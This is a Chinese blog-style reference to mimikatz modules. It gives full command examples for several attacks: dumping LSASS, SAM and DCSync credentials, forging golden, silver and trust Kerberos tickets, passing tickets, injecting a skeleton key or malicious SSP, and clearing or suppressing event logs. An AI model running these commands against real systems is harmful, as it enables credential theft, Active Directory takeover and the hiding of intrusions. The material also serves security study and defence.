---
title: mimikatz常用命令
date: 2017-07-30 19:45:41
tags: mimikatz, adsec
---

### mimikatz的一些常用模块
### 测试环境：Windows 2012 R2 子域DC
### 1.CRYPTO模块
crypto模块提供与Windows加密功能(CryptoAPI)接合的功能，主要用来导出那些没有被标记为“可导出”的证书

##### crypto::capi 给CryptoAPI打补丁，方便导出证书
![](../img/crypto.capi.png)

##### crypto::certificates 列出/导出证书
通常需要先执行`privilege::debug`提升权限
- /systemstore	-	可选	-	系统默认使用的证书存储类型（default:CERT_SYSTEM_STORE_CURRENT_USER）
- /store	-	可选	-	用于列出/导出证书（默认为:My)
- /export	-	可选	-	用于导出证书到文件
![](../img/crypto.cer.png)
- `crypto::stores`列出可用的`systemstore`和`store`参数的可用值
- 不可导出的key在导出的时候会出现错误信息（KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)），可以使用`crypto::capi, crypto::cng`来进行补丁，通常可以导出，但是也需要相应的权限，比如UAC

##### crypto::cng	给CNG服务打补丁，方便导出证书（补丁Keylso服务）
##### crypto::hash	对密码进行HASH操作
![](../img/crypto.hash.png)
##### crypto::keys	列出/导出密钥的容器
![](../img/crypto.keys.png)
##### crypto::providers	列出加密提供商
![](../img/crypto.providers.png)
##### crypto::stores		列出加密存储类型
/systemstore	-	可选	-	系统默认使用的证书存储类
store可用值:
CERT_SYSTEM_STORE_CURRENT_USER or CURRENT_USER
CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY or USER_GROUP_POLICY
CERT_SYSTEM_STORE_LOCAL_MACHINE or LOCAL_MACHINE
CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY or LOCAL_MACHINE_GROUP_POLICY
CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE or LOCAL_MACHINE_ENTERPRISE
CERT_SYSTEM_STORE_CURRENT_SERVICE or CURRENT_SERVICE
CERT_SYSTEM_STORE_USERS or USERS
CERT_SYSTEM_STORE_SERVICES or SERVICES

##### crypto:system 	提供系统证书文件的路径或者注册表配置


### 2.DPAPI模块
- DPAPI::BLOB	通过API或者Masterkey解除对DPAPI blob的保护
- DPAII::CACHE
- DPAPI::CAPI	CAPI KEY测试
- DPAPI::CNG	CNG KEY测试
- DPAPI::CRED	CER TEST
- DPAPI::CREDHIST	配置一个credhist文件
- DPAPI::MASTERKEY	配置一个masterkey文件或解除保护（需要密钥key）
- DPAPI::PROTECT	使用DPAPI保护数据
- DPAPI::VAULT		VAULT测试
- DPAPI::WIFI		WIFI测试（需要XML配置文件 - [reference Ben’s spreadsheet](https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel)）
- DPAPI::WWAN		WWAN测试（需要XML配置文件 - [reference Ben’s spreadsheet](https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel)）

### 3.EVENT模块
1.EVENT::CLEAR	清除事件日志
2.EVENT::DROP	给事件记录服务打补丁，从而避免产生新的事件
![](../img/event.png)

### 4.KERBEROS模块
KERBEROS模块用于与微软的KerberosAPI进行交互，执行该模块不需要特殊的权限
##### KERBEROS::ASK	请求TGS票据
![](../img/kerberos.ask.png)
##### KERBEROS::CLIST	列出在MIT/HEIMDALL缓存中的票据
##### KERBEROS::GOLDEN	创建黄金票据/白银票据/信任票据
该命令的功能是基于检索到的密码的hash类型类执行的

##### 黄金票据

使用黄金票据必须的一些条件：
- 域的名称，可使用(Get-ADDomain).DNSRoot获得
- 域的SID，可使用(Get-ADDomain).DomainSID.Value获得
- krbtgt账户的密码HASH,可以用mimikatz的`lssdump::lsa /inject /name:krbtgt`命令获得
- 一个用于模拟的用户ID（可以存在也可以不存在）

黄金票据的参数：
- /domain	指定域的名字
- /sid		指定域的SID
- /sids		指定想要欺骗在AD林中的其他用户/组的SID，通常根域中的 Enterprise Admins group 的SID为“S-1-5-21-1473643419-774954089-5872329127-519”
- /user		一个用于模拟的用户名
- /groups	可选，用户组的RID（通常第一个是主要的组），添加用户/计算机用户的RID，获得相对应的权限。默认管理组的RID： 513,512,520,518,519 
- /krbtgt	域KDC服务账户（krbtgt）的NTLM密码HASH，用于加密和签名TGT
- /ticket	可选，用于提供一个路径/名称来保存黄金票据，方便用户之后能够快速使用/ptt参数来将黄金票据注入到内存中使用
- /ptt		/ticket的代替参数，可以快速注入外部的黄金票据到内存中
- /id		可选，用户的RID，默认是500，为administrator的RID
- /startoffset	可选，票据可用时的起始偏移量（通常为-10和0），mimikatz默认为0
- /endin	可选，票据的生命周期，mimikatz默认为10年，AD的Kerberos策略默认设置为10小时
- /renewmax	可选，更新后的票据的最大生命周期，mimikatz默认10年，AD的Kerberos策略默认设置为7天，10080min
- /aes128	AES128 KEY
- /aes256	AES256 KEY



黄金票据的默认组：
- Domain Users SID: S-1-5-21<DOMAINID>-513
- Domain Admins SID: S-1-5-21<DOMAINID>-512
- Schema Admins SID: S-1-5-21<DOMAINID>-518
- Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)
- Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520

```
kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
```
![](../img/kerberos.godlen.jpg)

##### 白银票据
白银票据是一个TGS（和TGT的格式类似），使用了目标服务账户（由SPN映射标识）的NTLM密码HASH来进行加密和签名，mimikatz使用`kerberos::golden`来创建一个白银票据，白银票据创建的是TGS服务，只能访问有限的服务。
创建白银票据必要的参数，其他参数和黄金票据一样
- /target	目标服务器的FQDN
- /service	目标服务器上运行的Kerberos服务，这里填运行该服务的主体的名称，比如cifs，http，mssql
- /rc4		目标服务器的NTLM HASH（计算机账户或者用户账户，**一般为计算机账户，比如计算机名为DC,那么就是要DC$的HASH**）

白银票据的默认组
- Domain Users SID: S-1-5-21<DOMAINID>-513
- Domain Admins SID: S-1-5-21<DOMAINID>-512
- Schema Admins SID: S-1-5-21<DOMAINID>-518
- Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)
- Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520

```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
![](../img/silver.jpg)

#### 信任票据
一旦AD的信任密码HASH确定后，一个信任票据就会被创建（Mimikatz “privilege::debug” “lsadump::trust /patch” exit）

##### 伪造一个内部AD林的信任票据

步骤1：导出受信任的密码/密钥
```
mimikatz "privilege::debug" "lsadump::trust /patch" exit
```
![](../img/trust1.jpg)

步骤2：使用Mimikatz创建一个伪造的受信任票据（跨域TGT）
伪造票据说明了该票据的持有者为AD林中的Enterprise Admin，拥有从子域到父域的完全访问权限。值得注意的是该伪造的用户不存在于任何计算机上，因为使用了黄金票据来得到域的信任，mimikatz使用`kerberos::golden`来创建一个信任票据。
创建信任票据必要的参数，其他参数和黄金票据一样
- /target	目标域名的FQDN
- /service	目标服务器上运行的kerberos服务（krbtgt）
- /rc4		目标服务器上运行Kerberos服务的服务账号的NTLM HASH（krbtgt）
- /ticket	提供一个路径/名字来保存伪造的票据，方便之后使用/ptt参数快速将黄金票据注入到内存中使用

信任票据的默认组
- Domain Users SID: S-1-5-21<DOMAINID>-513
- Domain Admins SID: S-1-5-21<DOMAINID>-512
- Schema Admins SID: S-1-5-21<DOMAINID>-518
- Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)
- Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520

```
Mimikatz “kerberos::golden /domain:child.adsec.lab /sid:S-1-5-21-1420805320-1455282633-3118636415 /sids:S-1-5-21-809894267-1102385918-1530562782-519 /rc4:79003cc0433d25fe9606cf46f2aea8d1 /user:deadfk3 /service:krbtgt /target:adsec.lab /ticket:c:\temp\CHILD.ADSEC.LAB.kirbi” exit
SIDS是父域的Enterprise Admin SID，SID是当前域的SID，NTLM HASH是父域的rc4,使用lsadump::trust /patch可以得到
注：使用SIDS参数会创建一个信任票据，从而告诉目标域，该信任票据的持有者是一个Enterprise Admin成员
```
![](../img/trust2.jpg)

步骤3：使用步骤2创建的信任票据去获得目标域上目标服务的TGS，并保存TGS到文件
结果是TGS给EA提供了访问父（根）域的域控制器上的CIFS服务的权限
![](../img/kekeo1.jpg)

步骤4：把步骤3生成的TGS文件注入，以获得相应的权限去访问目标服务
注入前：
![](../img/kekeo3.jpg)
注入后：
![](../img/kekeo2.jpg)


##### KERBEROS::Hash	-	把密码hash成密钥

##### KERBEROS::List	-	列出所有保存在用户内存中的用户的票据（TGT/TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist
- /export	-	导出用户的票据到文件

使用`SEKURLSA::TICKETS`命令把当前系统上所有已验证用户的kerberos票据dump下来。有些情况下用户的证书不会导出，这时候需要运行`SEKURLSA::TICKETS /EXPORT`,需要相应的权限。
![](../img/kerberos.list.jpg)

##### KERBEROS::PTC		-	传递缓存（NT6）
*Nix类的系统，都会缓存kerberos凭证，这些缓存的数据可以使用mimikatz来进行拷贝和传递，同样对把Kerberos票据注入到缓存文件中也很有帮助。一个例子就是利用MS14068的漏洞，使用pykeke生成一个缓存文件，然后使用mimikatz的kerberos:ptc命令注入。

##### KERBEROS::PTT		-	传递票据
当得到一个Kerberos票据之后，它可以拷贝到其他系统上，并且能够有效的注入到当前会话，来模拟一次登陆，而无需与域控有任何通信，不需要特殊权限。
命令：SEKURLSA::PTT(pass-the-ticket)
- /filename	-	票据文件名，可以多个
- /diretory	-	票据目录，该目录下的所有kirbi文件都会被注入

先生成一个kribi黄金票据
```
"kerberos::golden /admin:deadfk /domain:child.adsec.lab /id:8888 /sid:S-1-5-21-1420805320-1455282633-3118636415 /krbtgt:a2ba962ef41bb5e9635c2ae3173ee8a3 /ticket:deadfk.kribi" exit
```
再使用ptt来注入
![](../img/kerberos.ptt.jpg)

##### KERBEROS::PURGE	清除当前会话中的所有kerberos票据

##### KERBEROS::TGT		获得当前用户的TGT
![](../img/kerberos.tgt.jpg)

### 5.LSADUMP
LSADUMP模块通过与Windows本地安全验证机构（LSA）进行交互获得凭证信息。该模块的大多数命令都需要`debug`权限或者本地管理员权限，一般管理员组都有`debug`权限，必须要用户手动输入`privilege::debug`才能进行提权.

##### LSADUMP::BACKUPKEYS
要求管理员权限
![](../img/lsadump.backupkeys.jpg)

##### LSADUMP::CACHE	-	获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)
需要管理员权限
![](../img/lsadump.cache.jpg)

##### LSADUMP::DCSYNC	-	向DC发起一个同步对象请求(获取账户密码数据)
要运行该命令,需要一些指定的权限:管理员组,域管理员组,企业管理员组成员以及域控制器的计算机账户都可以通过DCSync把密码读取出来.需要注意的是被设置只读属性的域控制器是无法把密码读取出来的。

###### DCSync是如何工作的
- 发现用户所指定的域名的域控制器
- 通过GetNCChanges去请求域控制器获取用户的凭证（利用了远程协议服务Directory Replication Service (DRS)）

DCSync参数选项
- /user	-	要获取的数据的用户ID或者SID
- /domain	-	可选，活动目录的FQDN域名。mimikatz会自动发现该域名下的DC，如果不指定该参数，默认是当前域
- /dc	-	指定域控
- /guid

命令例子：
```
从child.adsec.lab域取回jane用户的密码
Mimikatz “privilege::debug” “lsadump::dcsync /domain:child.adsec.lab /user:jane” exit
```
![](../img/lsadump.dcsync.jpg)

##### LSADUMP::LSA	-	从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证
要求system或者debug权限
- /inject - 注入LSASS进程获取凭证
- /name - 指定目标用户
- /id	- 目标账户的RID
- /patch - 补丁LSASS进程

`mimikatz "lsadump::lsa /inject" exit`
该命令如果在DC上运行，会导出整个活动目录的凭证信息，RID 502的是KRBTGT用户，RID 500的是默认域管理员账户
![](../img/lsadump.lsa1.jpg)
`lsadump::lsa /patch`只会导出活动目录里的NTLM HASH
![](../img/lsadump.lsa2.jpg)

##### LSADUMP::NETSYNC
netsync提供了一个简单的方法，通过白银票据让一个DC的计算机账户的密码去模拟一个域控制器，然后通过DCSYNC来获取目标账户的信息，包括密码数据。

##### LSADUMP::RPDATA

##### LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。
需要system或者debug权限
SAM包含用户密码的NTLM,部分LM HASH，该文件可以在线（需要system用户的token）或者离线工作（需要system权限和SAM HIVES文件或者备份）。
需要administrator权限（debug）或者本地system权限来运行在线SAM服务
![](../img/lsadump.sam1.jpg)

##### LSADUMP::SECRETS	-	获取syskey来解密SECRETS条目
需要system或者debug权限
![](../img/lsadump.secrets.jpg)

##### LSADUMP::TRUST	-	请求LSA server检索信任身份验证信息
需要system或者debug权限
从活动目录中存在的信任关系中提取数据，信任密钥也会显示。


### 6.MISC
mimikatz的MISC模块包含了很多不太适合其他一些应用场景的命令，最常用的一些命令是`MISC::AddSID, MISC::MemSSP, MISC::Skeleton`

##### MISC::ADDSID -（新版本该功能在sid模块下sid::add）
给账户添加SIDHISTORY，需要system或者debug权限。

##### MISC::CMD	- 运行CMD
需要管理员权限

##### MISC::compressme - 压缩打包自身

##### MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块
需要管理员权限
![](../img/misc.detours.jpg)

##### MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。
需要管理员权限，详细内容请看[post on Mimikatz SSP describes in-memory patching as well as more persistent SSP techniques](https://adsecurity.org/?p=1760)
![](../img/misc.memssp.jpg)


##### MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）
##### MISC::regedit - 打开注册表（没有DisableRegistryTools）
需要管理员权限

##### MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程
需要管理员权限，该操作给DC打补丁，让所有用户可以通过Master password（Skeleton key）和他们常用的密码进行验证
![](../img/misc.skeleton.jpg)

##### MISC::TASKMGR - 打开任务管理器
需要管理员权限

### 7.MINESWEEPER
##### MINESWEEPER::INFOS - 提供minesweeper的mine信息

### 8.NET
##### NET::user - 列出用户名及所属组
![](../img/net.user.jpg)

##### NET::GROUP
##### NET::LOCALGROUP

### 9.PEIVILEGE
##### PRIVILEGE::DEBUG - 获得debug权限
debug权限允许用户去调试他们不能访问的进程，比如一个拥有debug权限的用户进程启用token可以调试以local system权限运行的服务

以下命令都需要debug权限
##### PRIVILEGE::BACKUP - 备份一个权限
##### PRIVILEGE::DRIVER - 获得驱动权限
##### PRIVILEGE::ID - 获得ID所对应的权限
##### PRIVILEGE::NAME - 获得NAME所对应的权限
##### PRIVILEGE::RESTORE - 获得restore权限

### 10.PROCESS
该模块提供从进程中获取数据和与进程交互的功能

##### PROCESS::Exports - 列出进程
##### PROCESS::IMPORTS - 列出IMPORTS
##### PROCESS::list - 列出正在运行的进程
需要管理员权限
##### PROCESS::RESUME - 恢复一个进程
##### PROCESS::START - 启动一个进程
##### PROCESS::STOP - 停止
##### PROCESS::SUSPEND - 挂起


### 11.SEKURLSA
SEKURLSA模块与受保护的内存进行交互，从运行在内存中的LSASS中获取密码，keys，pin以及凭证信息。
需要管理员权限，debug权限，或者通过`token::elevate`提升到system权限。如果运行的是dump下来的lsass进程文件，则不需要提权。

##### SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥
![](../img/sekurlsa.backupkeys.png)

##### SEKURLSA::Credman - 列出凭证管理器
![](../img/sekurlsa.credman.png)

##### SEKURLSA::Dpapi - 列出缓存的masterkeys
![](../img/sekurlsa.dpapi.png)

##### SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret
![](../img/sekurlsa.dpapisystem.png)

##### SEKURLSA::EKEYS - 列出Kerberos加密密钥
![](../img/sekurlsa.ekeys.png)

##### SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）
![](../img/sekurlsa.kerberos.png)

##### SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据

##### SEKURLSA::LiveSSP - 列出LiveSSP凭证信息

##### SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息
账户密码使用可逆的方式存储在内存中，如果内存中存在密码信息，那么可以被显示出来。（适用于Windows8.1/Windows 2012 R2之前）。KB2871997补丁针对这个安全问题进行了修复，不过仍然需要手动添加额外的配置，需要管理员权限

##### SEKURLSA::Minidump - 切换到LSASS minidump进程上下文
需要注意的是minidump是对相同平台上的LSASS数据进行读取，NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64

##### SEKURLSA::MSV - 列出LM & NTLM凭证